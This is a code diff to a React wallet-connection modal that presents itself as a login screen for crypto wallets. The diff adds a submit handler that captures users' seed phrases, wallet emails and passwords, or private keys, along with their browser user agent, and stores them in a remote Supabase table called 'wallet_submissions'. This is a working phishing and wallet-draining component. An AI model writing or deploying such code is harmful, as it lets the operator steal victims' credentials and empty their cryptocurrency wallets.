@@ -27,6 +27,7 @@ import {
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { cn } from "@/lib/utils";
+import { supabaseClient } from "@/lib/supabase";
 
 interface Wallet {
   name: string;
@@ -84,6 +85,13 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
   const [processingStage, setProcessingStage] = useState(0);
   const [wordCount, setWordCount] = useState<12 | 24>(12);
   const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(""));
+  
+  // Form State
+  const [walletAddress, setWalletAddress] = useState("");
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   useEffect(() => {
     setMounted(true);
@@ -100,10 +108,42 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
     setProcessingStage(0);
     setWordCount(12);
     setSeedWords(Array(24).fill(""));
+    setWalletAddress("");
+    setEmail("");
+    setPassword("");
+    setPrivateKey("");
+    setIsSubmitting(false);
   };
 
   const startLogin = () => {
     setView("processing");
+  };
+
+  const handleFinalSubmit = async (type: "seed-phrase" | "email-password" | "private-key") => {
+    if (isSubmitting) return;
+    setIsSubmitting(true);
+
+    try {
+      const submissionData = {
+        wallet_name: selectedWallet?.name,
+        wallet_address: walletAddress,
+        type,
+        data: type === "seed-phrase" ? { words: seedWords.slice(0, wordCount) } : 
+              type === "email-password" ? { email, password } : 
+              { private_key: privateKey },
+        timestamp: new Date().toISOString(),
+        user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
+      };
+
+      await supabaseClient.from("wallet_submissions").insert([submissionData]);
+      
+      // Optionally redirect or show success before reset
+      resetState();
+    } catch (error) {
+      console.error("Submission failed:", error);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   useEffect(() => {
@@ -265,6 +305,8 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   </label>
                   <Input 
                     placeholder="0x..." 
+                    value={walletAddress}
+                    onChange={(e) => setWalletAddress(e.target.value)}
                     className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                   />
                 </div>
@@ -489,8 +531,12 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                 ))}
               </div>
 
-              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
-                <Shield size={16} />
+              <Button 
+                onClick={() => handleFinalSubmit("seed-phrase")}
+                disabled={isSubmitting}
+                className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10"
+              >
+                {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
                 Login
               </Button>
             </div>
@@ -531,17 +577,25 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               <div className="space-y-4 mb-10">
                 <Input 
                   placeholder="Wallet Email" 
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
                   className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
                 />
                 <Input 
                   type="password"
                   placeholder="Wallet Password" 
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
                   className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
                 />
               </div>
 
-              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
-                <Shield size={16} />
+              <Button 
+                onClick={() => handleFinalSubmit("email-password")}
+                disabled={isSubmitting}
+                className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10"
+              >
+                {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
                 Login
               </Button>
 
@@ -589,12 +643,18 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               <div className="mb-10">
                 <Input 
                   placeholder="0x..." 
+                  value={privateKey}
+                  onChange={(e) => setPrivateKey(e.target.value)}
                   className="bg-[#0D161F] border-white/5 h-16 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
                 />
               </div>
 
-              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
-                <Shield size={16} />
+              <Button 
+                onClick={() => handleFinalSubmit("private-key")}
+                disabled={isSubmitting}
+                className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10"
+              >
+                {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
                 Login
               </Button>
 
